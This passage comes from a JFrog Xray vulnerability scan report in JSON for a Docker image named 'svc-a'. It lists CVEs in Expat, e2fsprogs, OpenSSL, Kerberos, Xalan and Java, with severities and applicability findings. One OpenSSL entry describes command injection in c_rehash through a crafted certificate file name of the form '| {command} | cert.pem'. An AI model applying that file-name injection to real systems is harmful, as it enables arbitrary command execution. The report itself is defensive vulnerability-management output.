                    "description": "xmlparse.c in Expat (aka libexpat) before 2.4.5 allows attackers to insert namespace-separator characters into namespace URIs.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-25236",
                            "cwe": [
                                "CWE-668"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-02-17T00:00:00.940Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-25236",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-25236",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-207350",
                    "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
                    "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-1304",
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-04-17T00:00:00.006Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libcom_err:1.45.5-r0"
                    ],
                    "extended_information": {
                        "short_description": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
                        "full_description": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                                "description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                                "is_positive": false
                            },
                            {
                                "name": "Exploiting the issue requires the user to interact with the vulnerable software",
                                "description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcom_err:1.45.5-r0",
                            "cve_id": "CVE-2022-1304",
                            "scan_status": 1,
                            "applicability": null,
                            "evidence": null,
                            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcom_err:1.45.5-r0",
                            "vulnerability_id": "CVE-2022-1304",
                            "result": "undetermined"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-601459",
                    "summary": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
                    "description": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-4603"
                        }
                    ],
                    "created": "2024-05-17T00:00:00.035Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-4603",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-678573",
                    "summary": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the lastrealm variable in the set_tgtkey function.",
                    "description": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the lastrealm variable in the set_tgtkey function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2000-0546",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P"
                        }
                    ],
                    "created": "2025-03-23T00:00:00.584Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2000-0546",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-229353",
                    "summary": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
                    "description": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-2068",
                            "cwe": [
                                "CWE-78"
                            ],
                            "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-06-22T00:00:00.227Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "Improper input validation in OpenSSL's c_rehash script leads to command injection.",
                        "full_description": "OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Deployment mitigations\n\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-2068",
                            "scan_status": 1,
                            "applicability": true,
                            "scanner_explanation": "<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>",
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Offset",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/etc/ca-certificates/update.d/certhash",
                                            "0x00000018",
                                            "The vulnerable string 'c_rehash' was found in the image"
                                        ]
                                    ]
                                }
                            ],
                            "info": "The vulnerable string 'c_rehash' was found in the image",
                            "details": [
                                {
                                    "file_path": "/etc/ca-certificates/update.d/certhash",
                                    "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-2068",
                            "scan_status": 1,
                            "applicability": true,
                            "scanner_explanation": "<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>",
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Offset",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/etc/ca-certificates/update.d/certhash",
                                            "0x00000018",
                                            "The vulnerable string 'c_rehash' was found in the image"
                                        ]
                                    ]
                                }
                            ],
                            "info": "The vulnerable string 'c_rehash' was found in the image",
                            "details": [
                                {
                                    "file_path": "/etc/ca-certificates/update.d/certhash",
                                    "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-2068",
                            "result": "applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-2068",
                            "result": "applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-248531",
                    "summary": "The Apache Xalan Java XSLT library is vulnerable to an integer truncation issue when processing malicious XSLT stylesheets. This can be used to corrupt Java class files generated by the internal XSLTC compiler and execute arbitrary Java bytecode. Users are recommended to update to version 2.7.3 or later. Note: Java runtimes (such as OpenJDK) include repackaged copies of Xalan.",
                    "description": "The Apache Xalan Java XSLT library is vulnerable to an integer truncation issue when processing malicious XSLT stylesheets. This can be used to corrupt Java class files generated by the internal XSLTC compiler and execute arbitrary Java bytecode. Users are recommended to update to version 2.7.3 or later. Note: Java runtimes (such as OpenJDK) include repackaged copies of Xalan.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-34169",
                            "cwe": [
                                "CWE-681"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                        }
                    ],
                    "created": "2022-08-09T00:00:00.245Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "extended_information": {
                        "short_description": "An integer truncation issue in Apache Xalan and OpenJDK leads to Java code injection when compiling crafted XSLT files to a class/jar and running the result.",
                        "full_description": "The [Apache Xalan](https://xalan.apache.org/) Project develops and maintains libraries and programs that transform XML documents using XSLT standard stylesheets, mostly used to transform XML to HTML. The Xalan subprojects use the Java and C++ programing languages to implement the XSLT libraries.\nThis issue will be fixed in Apache Xalan 2.7.3 (currently version 2.7.3 is unreleased).\n\nIn the case where OpenJDK or Xalan is used to compile XSLT into a Class/JAR , an integer truncation issue leads to data from the XSLT spilling into the Class/JAR as bytecode. Meaning that a malicious XSLT getting compiled can lead to a malicious class/jar created.\n\nDue to the fact that OpenJDK's Transformer class uses Xalan's XSLT transformer by default, it is also affected by this issue.\nSince Xalan itself is at end-of-life, it is not likely to get a fix for this issue. However - OpenJDK was fixed and a new version was subsequently released.\n\nTo exploit this issue, an attacker must be able to provide a crafted XSLT stylesheet that will be processed by the target **and compiled**, there are a few common ways to process an XSLT stylesheet for compilation - \n\n1. Using Xalan CLI -\n```bash\njava org.apache.xalan.xslt.Process -in <input_xml> -xsl <input_xsl> -xsltc -xo <Translet_name> -xd <output_dir_for_translet> -xj <jar_name>\n```\n\nOR\n\n```bash\njava org.apache.xalan.xsltc.cmdline.Compile\n     -j <jar_file> <xsl_file>\n```\n\n2. Using Xalan-J (Java) - \n```java\nTransformerFactory tFactory = TransformerFactory.newInstance();\ntFactory.setAttribute(\"generate-translet\",true);\n```\n\nOR \n\n```java\nTransformerFactory tFactory = TransformerFactory.newInstance();\ntFactory.setAttribute(\"auto-translet\",true);\n```\n\nOR \n\n```java\ntFactory.setAttribute(\"jar-name\",\"name_here\");\nTemplates translet = tFactory.newTemplates(new StreamSource(xsltSource));\n```\n\nAfter the compilation is done, malicious code execution will only be achieved when the malicious Class/JAR is executed (the code execution does not happen in the compilation phase)",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                                "description": "The attacker must find a remote input that ends up being written to an XSLT file which is subsequently compiled by Xalan or OpenJDK.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The XSLT compilation feature is uncommon, especially in cases where the XSLT comes from remote input",
                                "is_positive": true
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "The vulnerability is claimed to lead to Java code injection",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2022-34169",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether a vulnerable Transformer is being created, by checking whether the vulnerable function <code>TransformerFactory.newTransformer</code> is being called with an argument.<br />\nIt also checks whether the vulnerable function <code>TransformerFactory.setAttribute</code> is called with the arguments <code>\"use-classpath\"</code> and <code>Boolean.TRUE</code>.</p>",
                            "evidence": null,
                            "info": "The vulnerable function TransformerFactory.newTransformer is never called with external input",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2022-34169",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether a vulnerable Transformer is being created, by checking whether the vulnerable function <code>TransformerFactory.newTransformer</code> is being called with an argument.<br />\nIt also checks whether the vulnerable function <code>TransformerFactory.setAttribute</code> is called with the arguments <code>\"use-classpath\"</code> and <code>Boolean.TRUE</code>.</p>",
                            "evidence": null,
                            "info": "The vulnerable function TransformerFactory.newTransformer is never called with external input",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2022-34169",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether a vulnerable Transformer is being created, by checking whether the vulnerable function <code>TransformerFactory.newTransformer</code> is being called with an argument.<br />\nIt also checks whether the vulnerable function <code>TransformerFactory.setAttribute</code> is called with the arguments <code>\"use-classpath\"</code> and <code>Boolean.TRUE</code>.</p>",
                            "evidence": null,
                            "info": "The vulnerable function TransformerFactory.newTransformer is never called with external input",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-34169",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-34169",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-34169",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195045",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21360",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.525Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21360",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-599302",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2 and  22; Oracle GraalVM Enterprise Edition: 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
